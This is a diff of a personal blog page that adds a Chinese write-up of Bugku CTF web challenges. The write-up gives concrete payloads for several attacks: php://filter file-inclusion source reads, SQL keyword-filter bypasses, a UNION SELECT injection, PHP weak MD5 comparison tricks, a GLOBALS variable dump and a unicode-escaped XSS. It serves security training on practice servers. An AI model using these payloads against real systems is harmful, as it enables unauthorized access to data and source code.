@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>我的第一篇文章 · kubo&#39;s blog</title>
+    <title>bugku-web · kubo&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >kubo&#39;s blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">我的第一篇文章</a>
+                <a href="#" class="post-name">bugku-web</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            我的第一篇文章
+            bugku-web
             <!-- 404 -->
             
         </h1>
@@ -261,12 +261,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">0</span> / Reading time: <span class="post-count">1 min</span></span>
+                        <span>Word count: <span class="post-count">567</span> / Reading time: <span class="post-count">3 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/14</span>
+                    <span class="post-intro-time">2018/08/04</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -390,14 +390,107 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        
+        <h1 id="is-numeric-函数漏洞"><a href="#is-numeric-函数漏洞" class="headerlink" title="is_numeric()函数漏洞"></a>is_numeric()函数漏洞</h1><p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字。</p>
+<p>可以使用?num=1[]绕过</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>f参数，文件包含，会过滤php，大写PHP，f=PHP://filter/read=convert.base64-encode/resource=./index</p>
+<pre><code>http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre><h1 id="常用字符串过滤"><a href="#常用字符串过滤" class="headerlink" title="常用字符串过滤"></a>常用字符串过滤</h1><blockquote>
+<p>$array =<br>array(‘table’,’union’,’and’,’or’,’load_file’,’create’,’delete’,’select’,’update’,’sleep’,’alter’,’drop’,’truncate’,’from’,’max’,’min’,’order’,’limit’);</p>
+<p>foreach ($array as $value)</p>
+<p>{</p>
+<p>if (substr_count($id, $value) &gt; 0)</p>
+<p>{</p>
+<p>exit(‘包含敏感关键字！’.$value);</p>
+<p>}</p>
+<p>}</p>
+</blockquote>
+<p>1、</p>
+<p>例：</p>
+<pre><code>?id=1 un&lt;b&gt;ion&lt;/b&gt; sel&lt;b&gt;ect&lt;/b&gt; 1,database()%23
+</code></pre><p>2、利用%00截断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 uni%00on se%00lect 1,database()%23</span><br></pre></td></tr></table></figure>
+<h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><h2 id="var-dump-args"><a href="#var-dump-args" class="headerlink" title="var_dump($$args)"></a>var_dump($$args)</h2><p><code>&lt;?php</code>  </p>
+<p><code>error_reporting`</code>(<code>0</code>);<code></code>include<code></code>“flag1.php”<code>;`  
+`highlight_file</code>(<code>__file__</code>);<code></code>if(isset(<code>$_GET</code>[<code>&#39;args&#39;</code>])){<code></code>$args<code></code>=<code></code>$_GET<code>[</code>‘args’<code>];`  
+`if(!</code>preg_match<code>(</code>“/^\w+$/“<code>,</code>$args<code>)){`  
+`die(</code>“args error!”<code>);`  
+`}`  
+`eval(</code>“var_dump($<code>$args</code>);”<code></code>);<code></code>}<code></code>?&gt;`</p>
+<p><code>使用超全局变量GLOBALS</code></p>
+<p><code>构造语句：</code></p>
+<pre><code>http://120.24.86.145:8004/index1.php?args=GLOBALS
+</code></pre><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>在控制台输入字符串</p>
+<h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>查看源码</p>
+<p>Unescape解密得</p>
+<pre><code>var p1 = &apos;function checkSubmit(){var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a){if(&quot;67d709b2b&apos;;
+
+var p2 = &apos;aa648cf6e87a7114f1&quot;==a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1}}document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit;&apos;;
+
+eval(unescape(p1) + unescape(&apos;54aa2&apos; + p2));
+</code></pre><p>得到</p>
+<p>67d709b2b54aa2 aa648cf6e87a7114f1</p>
+<p>输入得到flag</p>
+<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>构造语句：<code>http://120.24.86.145:8005/post/index.php?file=PHP://filter/read=convert.base64-encode/resource=./index.php</code></p>
+<p>得到</p>
+<pre><code>PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==
+</code></pre><p>Base64解密得到flag</p>
+<h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>根据题意爆破，使用burp爆破密码为13579输入得到flag</p>
+<h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>查看元素看到</p>
+<pre><code>var form = $(&apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos; +
+
+&apos;&lt;input type=&quot;text&quot; name=&quot;clicks&quot; value=&quot;&apos; + clicks + &apos;&quot; hidden/&gt;&apos; +
+
+&apos;&lt;/form&gt;&apos;);
+
+$(&apos;body&apos;).append(form);
+
+form.submit();
+
+}
+</code></pre><p>Post提交</p>
+<p>clicks=1000000得到flag</p>
+<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>根据题意用御剑扫目录得到备份文件</p>
+<pre><code>include_once &quot;flag.php&quot;;
+
+ini_set(&quot;display_errors&quot;, 0);
+
+$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);
+
+$str = substr($str,1);
+
+$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);
+
+parse_str($str);
+
+echo md5($key1);
+
+echo md5($key2);
+
+if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
+
+echo $flag.&quot;取得flag&quot;;
+</code></pre><p>php弱类型比较</p>
+<p>例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;));</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bool(true)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">故构造语句如下：</span><br></pre></td></tr></table></figure>
+<p><a href="http://120.24.86.145:8002/web16/?kekeyy1=QNKCDZO&amp;kkeyey2=240610708" target="_blank" rel="noopener">http://120.24.86.145:8002/web16/?kekeyy1=QNKCDZO&amp;kkeyey2=240610708</a></p>
+<p>得到flag</p>
+<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>简单的sql注入</p>
+<p>构造如下语句：</p>
+<pre><code>id=1&apos; and 1=2 UNION ALL SELECT 1,2,(SELECT GROUP_CONCAT(skctf_flag SEPARATOR 0x3c62723e) FROM skctf_flag.fl4g),4 #
+</code></pre><p>得到flag</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><pre><code>?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e
+</code></pre><p>这些代码是UNICODE编码值。可用js 的 unescape() 函数来解码。如: document.write(unescape(“<em>\u003c</em>\u003e”)); // 输出:&lt;&gt;</p>
+<p>绕过</p>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="http://www.lybsec.top">kubo</a>
-            <p>原文链接: <a href="http://www.lybsec.top/2018/07/14/我的第一篇文章/">http://www.lybsec.top/2018/07/14/我的第一篇文章/</a>
-            <p>发表日期: <a href="http://www.lybsec.top/2018/07/14/我的第一篇文章/">July 14th 2018, 6:46:42 pm</a>
+            <p>原文链接: <a href="http://www.lybsec.top/2018/08/04/bugku-web/">http://www.lybsec.top/2018/08/04/bugku-web/</a>
+            <p>发表日期: <a href="http://www.lybsec.top/2018/08/04/bugku-web/">August 4th 2018, 6:15:54 pm</a>
             <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -405,17 +498,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/04/thinkphp代码审计-1/" title= thinkphp代码审计 >
-                    <div class="nextTitle">thinkphp代码审计</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/14/hello-world/" title= Hello World >
-                    <div class="prevTitle">Hello World</div>
+                <a href= "/2018/08/04/sql_bypass/" title= sql_bypass >
+                    <div class="prevTitle">sql_bypass</div>
                 </a>
             
         </li>
@@ -527,7 +615,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#is-numeric-函数漏洞"><span class="toc-number">1.</span> <span class="toc-text">is_numeric()函数漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-number">2.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#常用字符串过滤"><span class="toc-number">3.</span> <span class="toc-text">常用字符串过滤</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#变量1"><span class="toc-number">4.</span> <span class="toc-text">变量1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#var-dump-args"><span class="toc-number">4.1.</span> <span class="toc-text">var_dump($$args)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web5"><span class="toc-number">5.</span> <span class="toc-text">web5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#头等舱"><span class="toc-number">6.</span> <span class="toc-text">头等舱</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">6.1.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag在index里"><span class="toc-number">6.2.</span> <span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#输入密码查看flag"><span class="toc-number">6.3.</span> <span class="toc-text">输入密码查看flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#点击一百万次"><span class="toc-number">6.4.</span> <span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#备份是个好习惯"><span class="toc-number">6.5.</span> <span class="toc-text">备份是个好习惯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#成绩单"><span class="toc-number">6.6.</span> <span class="toc-text">成绩单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">6.7.</span> <span class="toc-text">XSS</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
